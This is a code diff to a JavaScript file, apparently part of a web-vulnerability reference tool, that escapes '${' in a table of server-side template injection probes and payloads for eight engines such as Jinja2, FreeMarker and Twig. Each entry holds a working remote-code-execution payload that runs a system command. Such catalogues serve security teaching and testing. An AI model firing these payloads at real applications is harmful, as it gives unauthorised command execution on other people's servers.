@@ -4461,9 +4461,9 @@ function openWebVuln(id){
 const SSTI_ENGINES=[
   {engine:'Jinja2',    lang:'Python',  probe:'{{7*7}}',    rce:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`},
   {engine:'Tornado',   lang:'Python',  probe:'{{7*7}}',    rce:`{% import os %}{{ os.popen('id').read() }}`},
-  {engine:'Mako',      lang:'Python',  probe:'${7*7}',     rce:`${__import__('os').popen('id').read()}`},
+  {engine:'Mako',      lang:'Python',  probe:'${7*7}',     rce:`\${__import__('os').popen('id').read()}`},
   {engine:'ERB',       lang:'Ruby',    probe:'<%= 7*7 %>', rce:'<%= `id` %>'},
-  {engine:'FreeMarker',lang:'Java',    probe:'${7*7}',     rce:`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`},
+  {engine:'FreeMarker',lang:'Java',    probe:'${7*7}',     rce:`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`},
   {engine:'Velocity',  lang:'Java',    probe:'#set($x=7*7)$x', rce:`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`},
   {engine:'Twig',      lang:'PHP',     probe:'{{7*7}}',    rce:`{{['id']|filter('system')}}`},
   {engine:'Smarty',    lang:'PHP',     probe:'{7*7}',      rce:`{system('id')}`},
